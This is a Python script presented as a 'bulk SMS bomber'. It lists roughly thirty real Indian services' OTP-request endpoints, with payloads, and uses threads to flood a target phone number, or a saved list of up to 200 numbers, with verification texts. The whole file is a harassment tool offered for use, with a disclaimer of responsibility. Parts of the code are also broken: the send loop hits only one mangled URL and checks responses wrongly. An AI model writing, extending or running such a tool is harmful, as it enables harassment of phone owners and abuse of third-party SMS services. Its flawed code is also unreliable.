import requests
from requests.structures import CaseInsensitiveDict
import os
import threading
# api os sms bomber
def nsms(number,amount) : 
    number = str(number)
    amount = int(amount)


    url = "https://api.penpencil.co/v1/users/resend-otp?smsType=2"
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    data = '{"mobile":"'+number+'\","organizationId":"5eb393ee95fab7468a79d189"}'


    url1 = "https://api.penpencil.co/v1/users/resend-otp?smsType=2"
    headers1 = CaseInsensitiveDict()
    headers1["Content-Type"] = "application/json"
    data1 = '{"mobile":"'+number+'\","organizationId":"5eb393ee95fab7468a79d189"}'

    url2 = "https://identity.tllms.com/api/request_otp"
    headers2 = CaseInsensitiveDict()
    headers2["Content-Type"] = "application/json"
    data2 = '{"phone":"+91-'+number+'\","app_client_id":"90391da1-ee49-4378-bd12-1924134e906e"}'



    url3 = "https://khiladi.com/v1/exchange/user/userRegisterOtpSent"
    headers3 = CaseInsensitiveDict()
    headers3["Content-Type"] = "application/json"
    data3 = '{"mobileNo":"+91'+number+'\","userName":"LANDRLOID"}'


    url4 = "https://webrouter-bbe-prod.angelbroking.com/login/v3/generateLoginOTP"
    headers4 = CaseInsensitiveDict()
    headers4["Content-Type"] = "application/json"
    data4 = '{"country_code":"+91","is_otp_resend":false,"mob_no":"'+number+'\","user_id":""}'


    url5 = "https://seller.flipkart.com/napi/graphql"
    headers5 = CaseInsensitiveDict()
    headers5["Content-Type"] = "application/json"
    data5 = '{"operationName":"SellerOnboarding_GenerateOTPMobile","variables":{"mobileNo":"'+number+'\"},"query":"mutation SellerOnboarding_GenerateOTPMobile($mobileNo: String!) {\n  generateOTPMobile(mobileNo: $mobileNo)\n}\n"}'

    url6 = "https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_LOGIN&isBot=false&source=mobile"
    headers6 = CaseInsensitiveDict()
    headers6["Content-Type"] = "application/json"
    data6 = '{"query":"\n  mutation($email: String, $phone: String, $otpLength: Int) {\n    sendOtp(phone: $phone, email: $email, otpLength: $otpLength) {\n      success\n      message\n    }\n  }\n","variables":{"phone":"'+number+'\"}}'

    url7 = "https://www.samsung.com/in/api/v1/sso/otp/init"
    headers7 = CaseInsensitiveDict()
    headers7["Content-Type"] = "application/json"
    data7 = '{"user_id":"'+number+'\"}'

    url8 = "https://apinew.moglix.com/nodeApi/v1/login/sendOTP"
    headers8 = CaseInsensitiveDict()
    headers8["Content-Type"] = "application/json"
    data8 = '{"email":"","phone":"'+number+'\","type":"p","source":"signup","buildVersion":"24.0","device":"mobile"}'
    
    url9 = "https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash"
    headers9 = CaseInsensitiveDict()
    headers9["Content-Type"] = "application/json"
    data9 = '{"mobileNumber":"'+number+'\","otpTemplateId":"5b4e2e49b70e040008ffbcbe"}'

    url10 = "https://apistaging.justmyroots.com/api/web/auth/signup"
    headers10 = CaseInsensitiveDict()
    headers10["Content-Type"] = "application/json"
    data10 = '{"phoneNumber":"91'+number+'\","firstName":"JunN","lastName":"SENA","email":"srrrajput@gmail.com","location":"India"}'
    
    url11 = "https://tizola.in/api/login"
    headers11 = CaseInsensitiveDict()
    headers11["Content-Type"] = "application/x-www-form-urlencoded"
    data11 = "username="+number+'\"&password=RG5%2540znmkA%254073D"'

    url12 = "https://webapi.zoopindia.com/customers/resend-otp"
    headers12 = CaseInsensitiveDict()
    headers12["Content-Type"] = "application/json"
    data12 = '{"mobile":"'+number+'\","customerId":901718}'

    url13 = "https://webapi.zoopindia.com/customers/login"
    headers13 = CaseInsensitiveDict()
    headers13["Content-Type"] = "application/json"
    data13 = '{"mobile":"'+number+'\","source":"Mobile-Web"}'
    
    url14 = "https://api.shadowfax.in/delivery/otp/send/"
    headers14 = CaseInsensitiveDict()
    headers14["Content-Type"] = "application/json"
    data14 = '{"mobile_number":"'+number+'\"}'


    url15 = "https://www.khelplayrummy.com/component/weaver/?task=registration.otpBasedCommonAjaxFunction"

    headers15 = CaseInsensitiveDict()
    headers15["Content-Type"] = "application/x-www-form-urlencoded"
    data15 = "control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName="+number+'&isAjax=true"'

    url16 = "https://www.shopsy.in/api/1/action/view"   
    headers16 = CaseInsensitiveDict()
    headers16["Content-Type"] = "application/json"
    data16 = '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"'+number+'\","clientQueryParamMap":{"ret":"/reseller-homepage-store?utm_medium=GoogleAd&utm_campaign=Google-PerfMax&cmpid=Google-PerfMax&cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAjwyeujBhA5EiwA5WD7_QCLQc98rqTGftpXGqHEi1QZ_OKk7Rg76Aevk1OftIkhpIfX1rM1zxoCkL8QAvD_BwE","entryPage":"HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'
    
    url17= "https://www.khelplayrummy.com/component/weaver/?task=registration.otpBasedCommonAjaxFunction"
    headers17 = CaseInsensitiveDict()
    headers17["Content-Type"] = "application/x-www-form-urlencoded"
    data17 = "control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName="+number+'&isAjax=true"'

    url18 = "https://unacademy.com/api/v3/user/user_check/?enable-email=true"
    headers18 = CaseInsensitiveDict()
    headers18["Content-Type"] = "application/json"
    data18 = '{"phone":"'+number+'\","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}'
    
    url19 = "https://khiladi.com/v1/exchange/user/userRegisterOtpSent"
    headers19 = CaseInsensitiveDict()
    headers19["Content-Type"] = "application/json"
    data19 = '{"mobileNo":"+91'+number+'\","userName":"LANDROID"}'
    
    url20 = "https://www.rummycircle.com/api/fl/auth/v3/getOtp"
    headers20 = CaseInsensitiveDict()
    headers20["Content-Type"] = "application/json"
    data20 = '{"mobile":"'+number+'\","deviceId":"72abdd9a-7038-41c0-a57d-d0022dac60da","deviceName":"","refCode":"","isPlaycircle":false}'
    
    url21 = "https://www.my11circle.com/api/fl/auth/v3/getOtp"
    headers21 = CaseInsensitiveDict()
    headers21["Content-Type"] = "application/json"
    data21 = '{"mobile":"'+number+'\","deviceId":"1aeb7fad-58d0-4887-9f77-2a469039a413","deviceName":"","refCode":"","isPlaycircle":false}'

    url22 = "https://api.spinny.com/api/c/user/otp-request/"
    headers22 = CaseInsensitiveDict()
    headers22["Content-Type"] = "application/json"
    data22 = '{"contact_number":"'+number+'\","whatsapp":false,"code_len":4}'
    
    url23 = "https://api.gromoinsure.com/v1/auth/sendOTP"
    headers23 = CaseInsensitiveDict()
    headers23["Content-Type"] = "application/json"
    data23 = '{"phone":"'+number+'\"}'
    
    url24 = "https://www.tractorjunction.com/ajax/send-otp/?mobile="+number
    
    url25 = "https://kukufm.com/api/v1/users/auth/send-otp/"
    headers25 = CaseInsensitiveDict()
    headers25["Content-Type"] = "application/json"
    data25 = '{"phone_number":"+91'+number+'\"}'
    
    url26 = "https://customer.rapido.bike/api/otp"
    headers26 = CaseInsensitiveDict()
    headers26["Content-Type"] = "application/json"
    data26 = '{"mobile":"'+number+'\"}'

    url27 = "https://loginprod.medibuddy.in/unified-login/user/register"
    headers27 = CaseInsensitiveDict()
    headers27["Content-Type"] = "application/json"
    data27 = '{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"'+number+'\","screen":"login-page","advertiserId":"56d487a8-89b1-Lbd9-a831-c69940c6a649","mbUserId":null}'

    url28 = "https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp"
    headers28 = CaseInsensitiveDict()
    headers28["Content-Type"] = "application/json"
    data28 = '{"phone_no":"+91'+number+'\","website":true,"is_guest_checkout":false}'

    url29 = "https://www.tataplay.com/inception-pack/otp/resend-otp"
    headers29 = CaseInsensitiveDict()
    headers29["Content-Type"] = "application/json"
    data29 = '{"journeySource":"REGISTER","id":"'+number+'\"}'
   





    for j in range(amount):
        sender= response = requests.post(f"{url}{j}", headers=headers, json=data)
        if sender =="<Response [400]>":
            print("SMS SENT")
        elif sender == "<Response [200]>" :
            print("SMS SENT")
        
# threading for sms bomber
def sms(number, amount, th): 
    threads = []
    for _ in range(th):
        thread = threading.Thread(target=nsms, args=(number, amount))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
        print("Completed")
os.system("clear")
def main():
   
    print("""
      ____  _    _ _      _  __   _____ __  __  _____   ____   ____  __  __ ____  ______ _____  
     |  _ \| |  | | |    | |/ /  / ____|  \/  |/ ____| |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
     | |_) | |  | | |    | ' /  | (___ | \  / | (___   | |_) | |  | | \  / | |_) | |__  | |__) |
     |  _ <| |  | | |    |  <    \___ \| |\/| |\___ \  |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
     | |_) | |__| | |____| . \   ____) | |  | |____) | | |_) | |__| | |  | | |_) | |____| | \ \ 
     |____/ \____/|______|_|\_\ |_____/|_|  |_|_____/  |____/ \____/|_|  |_|____/|______|_|  \_\
         | |               /\                                    (_)             | |            
         | |__  _   _     /  \   _ __ _   _  __ _ _ __  _ __ __ _ _  ___ ___   __| | ___        
         | '_ \| | | |   / /\ \ | '__| | | |/ _` | '_ \| '__/ _` | |/ __/ _ \ / _` |/ _ \       
         | |_) | |_| |  / ____ \| |  | |_| | (_| | | | | | | (_| | | (_| (_) | (_| |  __/       
         |_.__/ \__, | /_/    \_\_|   \__, |\__,_|_| |_|_|  \__,_|_|\___\___/ \__,_|\___|       
                 __/ |                 __/ |                    _/ |                            
                |___/                 |___/                    |__/                             

    Note : I won't be responsible for any damage caused by this script. Use at your own risk.
    """)
    option = input("Enter 1 For SMS bomber\nEnter 2 For Create a list SMS Bomber\nEnter 3 For Bomb from SMS Bomber List\nEnter Option: ")
    if option == "1":
        number = input("Enter target number without +91: ")
        amount = int(input("Enter Amount to spam: "))
        th = int(input("Enter thread amount (default is 1): ") or 1)
        sms(number, amount,th)
    elif option == "2":
        print("You Selected to Create a list\n")
        namel = input("Enter Name Of List: ")
        dd = int(input("How many numbers do you want in your list (max 200): "))
        if dd <= 200:
            with open(f"{namel}_bomberlist.txt", "w") as file:
                for _ in range(dd):
                    number = input("Enter number without +91: ")
                    file.write(f'{number}\n')
        else:
            print("Enter Valid Amount")
    elif option == "3":
        print("You Selected to Bomb with list\n")
        jfile = input("Enter name of your list : ")
        filename = jfile
        if os.path.exists(f"{filename}_bomberlist.txt"):
            print(filename)
            with open(f'{filename}_bomberlist.txt',"r") as f:
                numbers = f.read().splitlines()
                th = int(input("Enter thread amount (default is 1): ") or 1)
                amount  = int(input("Enter amount of messages to send: "))
            for number in numbers:
                sms(number, amount,th)
            
        else:
            print("List Not Found")
    else:
        print("Invalid Option")


if __name__ == "__main__":
    main()
